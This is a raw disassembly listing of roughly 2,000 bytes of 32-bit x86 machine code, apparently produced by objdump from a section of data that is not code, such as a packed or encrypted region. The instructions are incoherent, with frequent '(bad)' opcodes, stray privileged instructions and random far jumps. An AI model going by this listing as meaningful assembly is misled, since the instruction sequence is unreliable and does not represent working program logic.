  41417b:	ins    DWORD PTR es:[edi],dx
  41417c:	mov    ebp,0x2c9e5fa7
  414181:	pop    edx
  414182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414183:	jmp    0x23b9:0x26d857ef
  41418a:	hlt    
  41418b:	xchg   esp,eax
  41418c:	xlat   BYTE PTR ds:[ebx]
  41418d:	pop    eax
  41418e:	das    
  41418f:	rol    BYTE PTR [ecx-0x16],0x78
  414193:	hlt    
  414194:	pop    edx
  414195:	add    ah,BYTE PTR [esi+edx*8]
  414198:	adc    DWORD PTR [edx+0x1a781ea9],ebp
  41419e:	xor    dh,bh
  4141a0:	loope  0x414144
  4141a2:	out    dx,al
  4141a3:	push   ebp
  4141a4:	je     0x41417b
  4141a6:	popa   
  4141a7:	stos   DWORD PTR es:[edi],eax
  4141a8:	in     eax,dx
  4141a9:	adc    ebp,DWORD PTR [esi+edx*4]
  4141ac:	into   
  4141ad:	mov    ds:0xd44b605f,eax
  4141b2:	push   edi
  4141b3:	mov    dl,0xd5
  4141b5:	cdq    
  4141b6:	push   esp
  4141b7:	adc    esi,0x580a8190
  4141bd:	cmp    ah,BYTE PTR [edi+eiz*2-0x3b883963]
  4141c4:	mov    dh,0xb8
  4141c6:	mov    DWORD PTR [eax],eax
  4141c8:	xor    BYTE PTR [edi-0x22],bl
  4141cb:	out    0x2f,al
  4141cd:	enter  0x6bd7,0x22
  4141d1:	push   esp
  4141d2:	pushf  
  4141d3:	dec    edi
  4141d4:	test   DWORD PTR [ebx-0x25],ebx
  4141d7:	fimul  DWORD PTR [eax]
  4141d9:	imul   ecx,edx,0xb9de666
  4141df:	xchg   esp,eax
  4141e0:	cmp    bh,ch
  4141e2:	xor    al,0x94
  4141e4:	pop    eax
  4141e5:	sub    dl,BYTE PTR [ebx+0x35]
  4141e8:	neg    DWORD PTR [ebp+0x39]
  4141eb:	and    eax,0x805ede51
  4141f0:	arpl   WORD PTR [esi],bp
  4141f2:	xchg   edi,eax
  4141f3:	lahf   
  4141f4:	daa    
  4141f5:	scas   al,BYTE PTR es:[edi]
  4141f6:	push   edi
  4141f7:	jb     0x414272
  4141f9:	cmp    dl,cl
  4141fb:	test   WORD PTR [eax+edi*4-0x21],bp
  414200:	mov    ecx,0xa3a06d4d
  414205:	cmp    esi,DWORD PTR [edx+0x5d2c0f53]
  41420b:	add    al,0xee
  41420d:	ret    
  41420e:	mov    BYTE PTR [edi+0x38d2c029],ah
  414214:	rcr    dh,0x3e
  414217:	int    0xb1
  414219:	pop    es
  41421a:	in     eax,0xe3
  41421c:	sub    DWORD PTR [edx-0x36],eax
  41421f:	rcr    DWORD PTR [ecx+0x71adc431],0x1e
  414226:	xor    al,0xfb
  414228:	push   esi
  414229:	jmp    0x526c0c68
  41422e:	(bad)  
  41422f:	lock cmp al,BYTE PTR [edi]
  414232:	sbb    dl,BYTE PTR [edx]
  414234:	ss push ebx
  414236:	adc    ebp,ecx
  414238:	push   0xc4e7f235
  41423d:	xchg   ebp,eax
  41423e:	push   ebx
  41423f:	(bad)  
  414240:	cmp    bl,BYTE PTR [edx+0x30f30ea4]
  414246:	fidivr DWORD PTR [edi-0x56]
  414249:	fisttp DWORD PTR [di+0x3bf7]
  41424e:	xchg   ebp,eax
  41424f:	jae    0x41422f
  414251:	dec    ecx
  414252:	or     BYTE PTR [edi+0xa],0x6e
  414256:	mov    dl,0xeb
  414258:	retf   
  414259:	outs   dx,BYTE PTR ds:[esi]
  41425a:	pop    ecx
  41425b:	cmp    DWORD PTR [ebx],ebx
  41425d:	jmp    0x3a54a4f3
  414262:	or     dh,BYTE PTR [edi+0x39e74d3a]
  414268:	sub    al,0x27
  41426a:	pop    esi
  41426b:	or     BYTE PTR [edx],al
  41426d:	pop    ecx
  41426e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414270:	lods   al,BYTE PTR cs:[esi]
  414272:	inc    esp
  414273:	ja     0x414216
  414275:	and    eax,0x1fe16d6e
  41427a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41427b:	mov    al,0x92
  41427d:	pop    ecx
  41427e:	out    dx,al
  41427f:	xor    bh,BYTE PTR ds:0x49717cb9
  414285:	mov    ah,0xb9
  414287:	mov    dl,0x7a
  414289:	and    BYTE PTR ds:0x45a1ed91,bh
  41428f:	cmp    eax,0xa2e7975f
  414294:	mov    ebx,0x7a933fe7
  414299:	dec    esi
  41429a:	mov    ds:0xe50af03a,eax
  41429f:	sti    
  4142a0:	push   esi
  4142a1:	test   DWORD PTR [ebx+0x2a],edi
  4142a4:	jae    0x4142ca
  4142a6:	mov    esp,0xabbf108
  4142ab:	int    0x1a
  4142ad:	mov    ebp,0xf8c10984
  4142b2:	xor    eax,DWORD PTR [eax]
  4142b4:	(bad)  
  4142b5:	ins    BYTE PTR es:[edi],dx
  4142b6:	cdq    
  4142b7:	int3   
  4142b8:	les    edi,FWORD PTR [ecx+0x47]
  4142bb:	imul   ebp,DWORD PTR [ebp-0x28],0xfffffff5
  4142bf:	xchg   edi,ebp
  4142c1:	mov    edi,0xf9f1357a
  4142c6:	and    eax,0x8813fc95
  4142cb:	and    eax,0x8d544dbb
  4142d0:	add    DWORD PTR [ebp+esi*8+0x4366150a],esi
  4142d7:	xchg   ecx,eax
  4142d8:	cmp    ebp,DWORD PTR ds:0x44f8afcc
  4142de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142df:	loope  0x414300
  4142e1:	xchg   edx,eax
  4142e2:	in     eax,dx
  4142e3:	push   eax
  4142e4:	inc    esp
  4142e5:	adc    eax,0x22c99693
  4142ea:	retf   
  4142eb:	aaa    
  4142ec:	mov    dh,0x88
  4142ee:	cmp    BYTE PTR [edi+ebp*1-0x1d],ch
  4142f2:	or     DWORD PTR [ecx],0x1e481627
  4142f8:	dec    esi
  4142f9:	call   0x3151:0x475ca661
  414300:	or     BYTE PTR [edx],ah
  414302:	inc    edi
  414303:	xchg   ch,cl
  414305:	and    edi,DWORD PTR ss:[ebp+0x18]
  414309:	jl     0x4142c6
  41430b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41430c:	mov    dl,0xdb
  41430e:	popf   
  41430f:	test   eax,0x3c0d58e4
  414314:	shr    al,cl
  414316:	mov    edi,0xcc3f2844
  41431b:	pop    ss
  41431c:	adc    ecx,DWORD PTR [ebp-0x22242971]
  414322:	inc    ebx
  414323:	xchg   ebx,eax
  414324:	mov    eax,0x81b84a0
  414329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41432a:	and    eax,0xbea08e5a
  41432f:	fstp   st(5)
  414331:	lods   eax,DWORD PTR ds:[esi]
  414332:	fstp   QWORD PTR [ebx-0x57184267]
  414338:	(bad)  
  414339:	jnp    0x4142f3
  41433b:	shl    DWORD PTR [eax*8+0x2225f14f],cl
  414342:	jnp    0x414352
  414344:	ror    DWORD PTR [ecx+0x325e5f21],cl
  41434a:	aam    0x26
  41434c:	jge    0x41438c
  41434e:	jge    0x4142d9
  414350:	ret    
  414351:	pop    ds
  414352:	jmp    0xf80d382d
  414357:	adc    eax,DWORD PTR [ecx-0x5]
  41435a:	lods   al,BYTE PTR ds:[esi]
  41435b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41435c:	int    0xb6
  41435e:	and    ebx,ecx
  414360:	mov    dh,0x99
  414362:	adc    DWORD PTR [eax],ebx
  414364:	xor    BYTE PTR [ecx],al
  414366:	push   esi
  414367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414368:	popa   
  414369:	popf   
  41436a:	xadd   DWORD PTR [edx],edi
  41436d:	(bad)  
  41436e:	outs   dx,DWORD PTR ds:[esi]
  41436f:	inc    esp
  414370:	div    BYTE PTR [eax-0x3c]
  414373:	jg     0x41435b
  414375:	(bad)  
  414376:	cmc    
  414377:	sub    ah,BYTE PTR [edi-0x75]
  41437a:	rcr    BYTE PTR [ecx+ebx*2],cl
  41437d:	outs   dx,DWORD PTR ds:[esi]
  41437e:	pop    es
  41437f:	jns    0x414337
  414381:	xchg   esp,eax
  414382:	jg     0x414400
  414384:	mov    bh,0xd1
  414386:	push   esp
  414387:	sbb    ebx,DWORD PTR [edx]
  414389:	loope  0x414318
  41438b:	sbb    BYTE PTR [eax],al
  41438d:	in     al,0x9e
  41438f:	and    edx,edi
  414391:	add    eax,0x3ffdb8a5
  414396:	and    BYTE PTR [esi-0x2],0x27
  41439a:	ja     0x4143bc
  41439c:	div    DWORD PTR [edx-0x21]
  41439f:	adc    BYTE PTR [ecx],cl
  4143a1:	sub    al,0x63
  4143a3:	push   edx
  4143a4:	xchg   edx,eax
  4143a5:	and    al,0xbe
  4143a7:	out    0xfb,eax
  4143a9:	fcom   st(4)
  4143ab:	pop    esp
  4143ac:	inc    esi
  4143ad:	cdq    
  4143ae:	sbb    DWORD PTR [edi+0x7a],esi
  4143b1:	std    
  4143b2:	jno    0x4143a3
  4143b4:	xor    esi,edi
  4143b6:	or     al,0xe3
  4143b8:	sub    edx,DWORD PTR [esi+0x55]
  4143bb:	xchg   BYTE PTR [esp+eax*2],cl
  4143be:	adc    ecx,ecx
  4143c0:	dec    ebx
  4143c1:	ins    BYTE PTR es:[edi],dx
  4143c2:	loope  0x414359
  4143c4:	push   0x4129766b
  4143c9:	call   0xbe131781
  4143ce:	xchg   edx,eax
  4143cf:	cmp    eax,0x1fe42b9c
  4143d4:	pop    ebp
  4143d5:	(bad)  [ebx-0x3d]
  4143d8:	aad    0x9b
  4143da:	lds    ecx,FWORD PTR [esi+0x39]
  4143dd:	popf   
  4143de:	fisubr DWORD PTR [ebx+0x3b]
  4143e1:	test   al,0xf2
  4143e3:	stc    
  4143e4:	push   ds
  4143e5:	jne    0x414441
  4143e7:	push   0x5f
  4143e9:	push   ebx
  4143ea:	pop    ds
  4143eb:	loop   0x414418
  4143ed:	aaa    
  4143ee:	std    
  4143ef:	dec    ecx
  4143f0:	mov    ch,0x84
  4143f2:	stos   BYTE PTR es:[edi],al
  4143f3:	fdivr  QWORD PTR [esi]
  4143f5:	leave  
  4143f6:	hlt    
  4143f7:	mov    esi,0xfd5c99da
  4143fc:	and    edi,DWORD PTR [ebp+0x54d4b78d]
  414402:	mov    ds:0xd352d1c1,eax
  414407:	ins    DWORD PTR es:[edi],dx
  414408:	sahf   
  414409:	xor    al,0x4f
  41440b:	sub    BYTE PTR [edx+0x285df8b7],al
  414411:	call   0xb59a:0xaaabdd9e
  414418:	lds    ebp,FWORD PTR [eax]
  41441a:	sbb    DWORD PTR [edx],eax
  41441c:	in     al,0x83
  41441e:	ds imul esi,esi,0xd79b43b5
  414425:	scas   eax,DWORD PTR es:[edi]
  414426:	cmp    esp,edx
  414428:	clc    
  414429:	sbb    eax,0xac9df3fe
  41442e:	jp     0x414447
  414430:	cli    
  414431:	mov    ds,WORD PTR [ebp+0x4743e48d]
  414437:	pop    esp
  414438:	push   edi
  414439:	cmp    BYTE PTR [ebp-0x35a05611],bl
  41443f:	add    BYTE PTR [esp+eax*2+0x5c],cl
  414443:	add    eax,0x8e1bab59
  414448:	fwait
  414449:	popa   
  41444a:	js     0x4143dc
  41444c:	or     ebx,ecx
  41444e:	lock call 0xa311:0xb79eeb00
  414456:	mov    edi,0x7a8a02af
  41445b:	dec    ecx
  41445c:	sub    eax,0x7afb9426
  414461:	pop    ecx
  414462:	dec    ecx
  414463:	ret    0xf008
  414466:	xor    al,BYTE PTR [ecx]
  414468:	mov    ebp,0xf3d3e9f4
  41446d:	adc    bh,BYTE PTR [ebx]
  41446f:	dec    eax
  414470:	cmp    eax,DWORD PTR [ebx-0x10]
  414473:	pusha  
  414474:	shl    BYTE PTR [esi],0xc
  414477:	bound  esp,QWORD PTR [edi]
  414479:	das    
  41447a:	push   esi
  41447b:	(bad)  
  41447c:	(bad)  
  41447d:	xlat   BYTE PTR ds:[ebx]
  41447e:	push   ecx
  41447f:	sbb    edi,esp
  414481:	cmc    
  414482:	out    0x73,al
  414484:	pop    ss
  414485:	jp     0x414480
  414487:	jne    0x414503
  414489:	xor    BYTE PTR [edi+0x5ec3cf45],0xb9
  414490:	pop    edx
  414491:	in     eax,0xd9
  414493:	mov    al,0xdb
  414495:	inc    esi
  414496:	jmp    0x428c:0x70dc6c30
  41449d:	push   ds
  41449e:	rcl    BYTE PTR [edx],0xf9
  4144a1:	repnz dec edi
  4144a3:	xchg   edi,eax
  4144a4:	lock dec ebp
  4144a6:	iret   
  4144a7:	cwde   
  4144a8:	sbb    cl,dl
  4144aa:	xchg   esi,eax
  4144ab:	jecxz  0x41450e
  4144ad:	sbb    ah,BYTE PTR [edi-0x1fe88e84]
  4144b3:	adc    al,0x20
  4144b5:	mov    ecx,0x112eb0dd
  4144ba:	jmp    DWORD PTR [edx+ebp*1-0x6702a5ba]
  4144c1:	mov    eax,ds:0x68c7fe17
  4144c6:	jge    0x414460
  4144c8:	idiv   cl
  4144ca:	jo     0x41450b
  4144cc:	ret    0x648c
  4144cf:	call   0xee1aab55
  4144d4:	cmc    
  4144d5:	clc    
  4144d6:	das    
  4144d7:	int3   
  4144d8:	adc    BYTE PTR [ebp+0x5f],dh
  4144db:	adc    al,0xa0
  4144dd:	mov    bh,0x37
  4144df:	pop    edi
  4144e0:	adc    dl,bh
  4144e2:	xchg   esp,eax
  4144e3:	ret    0x5402
  4144e6:	dec    esp
  4144e7:	je     0x41450b
  4144e9:	sub    al,BYTE PTR [ebx-0x74]
  4144ec:	sub    ah,ah
  4144ee:	add    ax,0x5161
  4144f2:	inc    esp
  4144f3:	dec    ebx
  4144f4:	shr    DWORD PTR [ecx+edi*8],cl
  4144f7:	(bad)  
  4144f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144fa:	xchg   edi,eax
  4144fb:	xchg   ecx,eax
  4144fc:	sti    
  4144fd:	pop    DWORD PTR [edi+0x2310ff30]
  414503:	add    BYTE PTR [ebx-0x7ca1d017],dh
  414509:	dec    esp
  41450a:	jle    0x4144d5
  41450c:	cmc    
  41450d:	cmc    
  41450e:	adc    BYTE PTR [ecx+0x41],dh
  414511:	ja     0x414589
  414513:	sub    DWORD PTR [edx+0xb817d23],ebp
  414519:	sahf   
  41451a:	ret    
  41451b:	mov    edi,0x41d26473
  414520:	mov    dh,0x78
  414522:	lods   al,BYTE PTR ds:[esi]
  414523:	and    eax,0x14
  414526:	loop   0x4144cd
  414528:	cmp    BYTE PTR [ecx],dl
  41452a:	push   ecx
  41452b:	(bad)  
  41452c:	mov    ?,edx
  41452e:	into   
  41452f:	dec    ecx
  414530:	mov    ds:0x9838d829,eax
  414535:	mov    edi,0x713ab57f
  41453a:	das    
  41453b:	push   ecx
  41453c:	pushf  
  41453d:	clc    
  41453e:	adc    eax,ecx
  414540:	jmp    0xa27aa24f
  414545:	cmc    
  414546:	add    bh,BYTE PTR fs:[ecx+ebp*1]
  41454a:	bound  esi,QWORD PTR [ecx]
  41454c:	jbe    0x414561
  41454e:	inc    esi
  41454f:	outs   dx,DWORD PTR ds:[esi]
  414550:	bound  eax,QWORD PTR [ebx+0x2e975fff]
  414556:	ret    
  414557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414558:	push   ebx
  414559:	sub    BYTE PTR [ecx+0x44],0x26
  41455d:	inc    edi
  41455e:	or     DWORD PTR [ecx+0x75],esp
  414561:	mov    esi,0xfe7a0b42
  414566:	fisub  DWORD PTR [eax-0x65]
  414569:	fstp   TBYTE PTR [edi+0xe]
  41456c:	imul   ebp,DWORD PTR [eax+0x23f720fd],0xa9f4a3c2
  414576:	mov    bl,0x44
  414578:	cmp    DWORD PTR [edx],esi
  41457a:	pop    es
  41457b:	aas    
  41457c:	out    dx,al
  41457d:	cli    
  41457e:	pop    es
  41457f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414580:	out    0x44,al
  414582:	out    0x75,eax
  414584:	adc    BYTE PTR [esi-0x6f153ca3],0x64
  41458b:	add    DWORD PTR [edi],eax
  41458d:	loopne 0x4145c6
  41458f:	sub    eax,0x827fb697
  414594:	dec    esp
  414595:	pusha  
  414596:	(bad)  
  414597:	stc    
  414598:	test   DWORD PTR [ebx-0x226c0fca],esi
  41459e:	out    0xae,al
  4145a0:	mov    eax,ds:0xe0256398
  4145a5:	stos   DWORD PTR es:[edi],eax
  4145a6:	mov    al,0x69
  4145a8:	mov    edi,0xc0e7027b
  4145ad:	dec    ebx
  4145ae:	and    dl,cl
  4145b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145b1:	lods   al,BYTE PTR ds:[esi]
  4145b2:	pusha  
  4145b3:	loope  0x414609
  4145b5:	pop    ebx
  4145b6:	adc    DWORD PTR [edi+0x48973f12],esi
  4145bc:	nop
  4145bd:	daa    
  4145be:	push   cs
  4145bf:	xor    eax,0x33c61bfa
  4145c4:	jp     0x41460e
  4145c6:	mov    ebx,ecx
  4145c8:	test   eax,0x3ff2d84c
  4145cd:	xchg   ebx,eax
  4145cf:	jle    0x4145df
  4145d1:	mov    ah,0xf8
  4145d3:	stos   BYTE PTR es:[edi],al
  4145d4:	push   cs
  4145d5:	mov    gs,WORD PTR [ecx]
  4145d7:	in     eax,0x55
  4145d9:	adc    bh,bl
  4145db:	push   ebp
  4145dc:	nop
  4145dd:	add    al,0xc8
  4145df:	call   0x65dd0ca5
  4145e4:	mov    DWORD PTR [eax],esp
  4145e6:	and    eax,DWORD PTR [esi-0x78280346]
  4145ec:	adc    edx,ebp
  4145ee:	jle    0x414607
  4145f0:	cmp    DWORD PTR [esi],edi
  4145f2:	xchg   DWORD PTR [ebp+0x22],edx
  4145f5:	rcl    DWORD PTR [edx+0x1e],cl
  4145f8:	fcom   QWORD PTR [edx-0x446d6881]
  4145fe:	xchg   BYTE PTR ds:0xe855e1db,al
  414604:	fwait
  414605:	xor    al,0x8a
  414607:	lea    ebx,[esi]
  414609:	mov    eax,ds:0xe305e7f2
  41460e:	int    0xe4
  414610:	popf   
  414611:	fs jae 0x414661
  414614:	lods   al,BYTE PTR ds:[esi]
  414615:	fndisi(8087 only) 
  414617:	and    bl,BYTE PTR [ebx-0x20]
  41461a:	sbb    ah,BYTE PTR [ebx+0x33]
  41461d:	les    esp,FWORD PTR [eax-0x639c0f0]
  414623:	jmp    0x545803a0
  414628:	cmp    edi,DWORD PTR [ecx]
  41462a:	pop    edx
  41462b:	mov    esi,0x5c2f6244
  414630:	(bad)  [eax]
  414632:	(bad)  
  414633:	lods   al,BYTE PTR ds:[esi]
  414634:	or     edi,esi
  414636:	mov    bl,0x1d
  414638:	mov    ds:0x775d1167,al
  41463d:	pop    ebp
  41463e:	push   0x8
  414640:	popa   
  414641:	add    ebp,DWORD PTR [edx+0x4b3f2c66]
  414647:	cdq    
  414648:	mov    ch,0x7b
  41464a:	add    BYTE PTR [edi-0x1f6d021f],dh
  414650:	ins    BYTE PTR es:[edi],dx
  414651:	dec    eax
  414652:	pop    ss
  414653:	(bad)  
  414654:	shl    DWORD PTR [edi],1
  414656:	push   0x38d22a85
  41465b:	push   ss
  41465c:	ds jmp 0x414621
  41465f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414660:	(bad)  
  414661:	das    
  414662:	jecxz  0x414641
  414664:	test   DWORD PTR [eax+0x7aa246e2],ecx
  41466a:	mov    ecx,0xa2db03ac
  41466f:	or     eax,0xd32e7392
  414674:	jmp    0xc587:0xd648e472
  41467b:	sbb    bh,dl
  41467d:	cdq    
  41467e:	and    BYTE PTR [esi-0x6],0x4b
  414682:	add    ecx,DWORD PTR [ecx]
  414684:	push   edi
  414685:	xchg   edi,eax
  414686:	inc    esp
  414687:	push   edi
  414688:	push   edi
  414689:	(bad)  
  41468b:	adc    eax,0x54537d49
  414690:	js     0x4146bb
  414692:	xor    bl,cl
  414694:	sbb    DWORD PTR [edx],esi
  414696:	mov    ds:0xbecd0025,eax
  41469b:	xchg   edx,eax
  41469c:	xchg   edi,eax
  41469d:	or     al,0xbc
  41469f:	sbb    edx,DWORD PTR [eax-0x21]
  4146a2:	push   eax
  4146a3:	jbe    0x4146e4
  4146a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a6:	lock mov cl,0x93
  4146a9:	cdq    
  4146aa:	in     al,dx
  4146ab:	mov    al,BYTE PTR [ebp-0x72]
  4146ae:	sbb    edx,DWORD PTR [ebx+0x330c2f0b]
  4146b4:	sbb    eax,0x88514099
  4146b9:	dec    esi
  4146ba:	pop    esi
  4146bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146bd:	iret   
  4146be:	inc    eax
  4146bf:	adc    al,0xd2
  4146c1:	inc    edi
  4146c2:	jne    0x414664
  4146c4:	fucom  st(6)
  4146c6:	mov    ebx,0xc512185c
  4146cb:	jg     0x4146da
  4146cd:	enter  0x46ae,0x6c
  4146d1:	cs ror dh,cl
  4146d4:	sub    bl,BYTE PTR [edx+0x49]
  4146d7:	loopne 0x4146c6
  4146d9:	test   esp,0xaebff71a
  4146df:	push   edx
  4146e0:	inc    ebx
  4146e1:	lods   eax,DWORD PTR ds:[esi]
  4146e2:	mov    ds:0x390dc064,eax
  4146e7:	cmp    bl,BYTE PTR [ebx+0x4e]
  4146ea:	add    dh,0x21
  4146ed:	or     edi,DWORD PTR [edx-0x43]
  4146f0:	clc    
  4146f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146f2:	aas    
  4146f3:	pop    ecx
  4146f4:	cmp    eax,0x27509789
  4146f9:	dec    ebp
  4146fa:	jecxz  0x4146ff
  4146fc:	cmp    esi,ecx
  4146fe:	dec    esi
  4146ff:	and    BYTE PTR [eax],al
  414701:	xchg   esi,eax
  414702:	add    esp,DWORD PTR [ebx+0x79]
  414705:	mov    ss,WORD PTR [edx-0x5a32e134]
  41470b:	sbb    edi,edi
  41470d:	jl     0x41478b
  41470f:	jnp    0x41477b
  414711:	xor    esp,DWORD PTR [ebp+0x16b36dc3]
  414717:	aad    0xb6
  414719:	les    eax,FWORD PTR [ebx-0x2e]
  41471c:	dec    ebx
  41471d:	xlat   BYTE PTR ds:[ebx]
  41471e:	dec    ecx
  41471f:	cli    
  414720:	jmp    0x2c66:0x25424aee
  414727:	add    BYTE PTR [ebx+0x61],dh
  41472a:	xchg   esp,esi
  41472c:	inc    ecx
  41472d:	fcomp  st(2)
  41472f:	jg     0x414707
  414731:	jmp    0xece73591
  414736:	xchg   edi,eax
  414737:	sbb    eax,0xae00c2a
  41473c:	or     eax,0x2bc934f4
  414741:	or     BYTE PTR [esi],ah
  414743:	and    BYTE PTR [eax],0x99
  414746:	and    al,0xb5
  414748:	in     al,dx
  414749:	out    0xd1,al
  41474b:	inc    edi
  41474c:	jmp    0x6dfc:0xd01ceb8a
  414753:	jns    0x41473a
  414755:	(bad)  
  414756:	xor    DWORD PTR [ecx+0x3c99becd],0xffffff86
  41475d:	cdq    
  41475e:	iret   
  41475f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414760:	cdq    
  414761:	pop    ecx
  414762:	cmp    ebx,DWORD PTR [ebp+0x33edd45d]
  414768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414769:	lods   al,BYTE PTR ds:[esi]
  41476a:	pop    ss
  41476b:	or     al,0xa8
  41476d:	ins    BYTE PTR es:[edi],dx
  41476e:	sub    eax,DWORD PTR [ebp-0x36]
  414771:	in     al,0xa5
  414773:	(bad)  
  414774:	xchg   esp,eax
  414775:	pop    ecx
  414776:	imul   ebx,DWORD PTR [ecx+eax*2],0xa431371a
  41477d:	fcomp  QWORD PTR cs:[ebx+0x2c]
  414781:	ja     0x414801
  414783:	cmp    DWORD PTR [edi+0x253acce5],esp
  414789:	jp     0x414713
  41478b:	and    BYTE PTR [ebx+0x2f],ch
  41478e:	adc    edx,eax
  414790:	std    
  414791:	push   edi
  414792:	dec    eax
  414793:	int    0xbb
  414795:	mov    ds:0x332476ba,al
  41479a:	add    eax,0x47329573
  41479f:	push   0xffffffd2
  4147a1:	push   es
  4147a2:	stc    
  4147a3:	fist   WORD PTR [eax-0x74fa334a]
  4147a9:	inc    ebx
  4147aa:	adc    DWORD PTR [edx-0x31],edi
  4147ad:	mov    dh,0x98
  4147af:	leave  
  4147b0:	sbb    cl,BYTE PTR [ebp+0x66a85646]
  4147b6:	pop    ss
  4147b7:	loop   0x4147c6
  4147b9:	xchg   esp,eax
  4147ba:	fsubr  st(0),st
  4147bc:	push   cs
  4147bd:	lahf   
  4147be:	jns    0x41482e
  4147c0:	xchg   ebx,eax
  4147c1:	fdivr  DWORD PTR [eax]
  4147c3:	sub    ecx,esi
  4147c5:	cld    
  4147c6:	and    esp,ebp
  4147c8:	sbb    DWORD PTR [eax-0x59],ecx
  4147cb:	dec    ecx
  4147cc:	call   0xa037:0x4d0f2726
  4147d3:	inc    edi
  4147d4:	and    edx,edx
  4147d6:	pop    ds
  4147d7:	dec    ebx
  4147d8:	sahf   
  4147d9:	fiadd  WORD PTR [ebp-0x45e8ce35]
  4147df:	nop
  4147e0:	call   DWORD PTR [esi]
  4147e2:	or     eax,0xc5e05d61
  4147e7:	inc    edx
  4147e8:	nop
  4147e9:	or     ecx,eax
  4147eb:	lea    eax,[ebx]
  4147ed:	inc    eax
  4147ee:	stos   DWORD PTR es:[edi],eax
  4147ef:	imul   ecx,DWORD PTR [eax+0x19f3d4e7],0xffffff9c
  4147f6:	ret    
  4147f7:	hlt    
  4147f8:	xchg   ebx,eax
  4147f9:	inc    edi
  4147fa:	fcom   QWORD PTR [edx+0x1edbb098]
  414800:	out    0x47,al
  414802:	sbb    al,0x8d
  414804:	retf   
  414805:	(bad)  
  414806:	sbb    bl,BYTE PTR [ecx+0x2dfb9429]
  41480c:	je     0x4147a2
  41480e:	aas    
  41480f:	dec    ebp
  414810:	aas    
  414811:	or     DWORD PTR [eax-0x1b3bc419],0x0
  414818:	xor    eax,esp
  41481a:	mov    fs,WORD PTR [ebx+0x63]
  41481d:	xchg   edi,eax
  41481e:	mov    esi,0xea48c7a9
  414823:	jb     0x414886
  414825:	imul   esp,DWORD PTR gs:[ecx+0x6f],0x8db6a805
  41482d:	mov    ebx,0x2f5fafa2
  414832:	ds int3 
  414834:	not    DWORD PTR cs:[ebx]
  414837:	aad    0x66
  414839:	cmp    eax,0x794567d3
  41483e:	pusha  
  41483f:	jo     0x41489f
  414841:	jge    0x41482a
  414843:	popa   
  414844:	leave  
  414845:	lods   eax,DWORD PTR ds:[esi]
  414846:	rcr    BYTE PTR [esi],cl
  414848:	cmp    bh,BYTE PTR [eax+eax*1+0x2a]
  41484c:	cld    
  41484d:	popa   
  41484e:	push   cs
  41484f:	and    DWORD PTR [edi+ecx*1-0x2b],ebx
  414853:	(bad)  
  414854:	adc    edx,DWORD PTR [edi]
  414856:	(bad)  
  414857:	imul   eax,esp,0x570e0b59
  41485d:	adc    ebp,DWORD PTR [ebp+0x6d]
  414860:	mov    cs,WORD PTR [eax]
  414862:	cli    
  414863:	lahf   
  414864:	sub    eax,0xe8324f22
  414869:	mov    cl,0x2f
  41486b:	jbe    0x414808
  41486d:	ficom  DWORD PTR [esi]
  41486f:	stc    
  414870:	popf   
  414871:	in     al,dx
  414872:	jo     0x414811
  414874:	dec    eax
  414875:	fwait
  414876:	cmc    
  414877:	jb     0x4147fc
  414879:	fsubr  QWORD PTR [eax+0x58]
  41487c:	loop   0x4148ac
  41487e:	jne    0x4148f2
  414880:	int3   
  414881:	and    cl,BYTE PTR [edi]
  414883:	adc    BYTE PTR [ebp+0x2a2b746d],0xf0
  41488a:	leave  
  41488b:	fs ds imul ebp,esp,0xc9cef74b
  414893:	push   edx
  414894:	fwait
  414895:	rol    DWORD PTR [edi+ebp*8+0x38885350],1
  41489c:	push   ss
  41489d:	or     bl,ah
  41489f:	aaa    
  4148a0:	arpl   WORD PTR [eax+ebp*1+0x4dc3a9fb],di
  4148a7:	xor    eax,0x89820924
  4148ac:	push   ebx
  4148ad:	push   esi
  4148ae:	(bad)  
  4148af:	jmp    0x5085:0x5f0bfa86
  4148b6:	lods   eax,DWORD PTR ds:[esi]
  4148b7:	sub    eax,0xb993a1f5
  4148bc:	jae    0x414848
  4148be:	loopne 0x4148d9
  4148c0:	clc    
  4148c1:	loop   0x4148d8
  4148c3:	pop    ds
  4148c4:	pop    ebx
  4148c5:	adc    eax,0xbe24efb9
  4148ca:	jo     0x4148d8
  4148cc:	push   ds
  4148cd:	fcmovnbe st,st(0)
  4148cf:	arpl   ax,si
  4148d1:	xchg   ebx,eax
  4148d2:	mov    ch,0xca
  4148d4:	sub    ecx,ebp
  4148d6:	mov    ebp,0x1fda7fc
  4148db:	jecxz  0x414948
  4148dd:	dec    ecx
  4148de:	jmp    0x77dd007e
  4148e3:	add    DWORD PTR [ebp-0x37],eax
  4148e6:	out    0xd9,eax
  4148e8:	retf   
  4148e9:	test   eax,0x5500a991
  4148ee:	mov    al,0x53
  4148f0:	jmp    DWORD PTR [edi-0xe3b2e15]
  4148f6:	repnz add edi,edi
  4148f9:	fild   DWORD PTR [esi-0x1d2f8c11]
  4148ff:	js     0x4148d4
  414901:	mov    eax,ds:0xa58b2473
  414906:	das    
  414907:	push   ebp
  414908:	cdq    
  414909:	jp     0x4148c5
  41490b:	xor    bl,BYTE PTR [eax+0x44]
  41490e:	je     0x414897
  414910:	jg     0x4148ec
  414912:	aaa    
  414913:	ret    0x27cd
  414916:	and    al,0xd4
  414918:	inc    esi
  414919:	aad    0xf0
  41491b:	popf   
  41491c:	xor    dh,0xa1
  41491f:	iret   
  414920:	or     eax,0x22601d66
  414925:	pop    ss
  414926:	xchg   DWORD PTR [edi+0x2f188dc0],eax
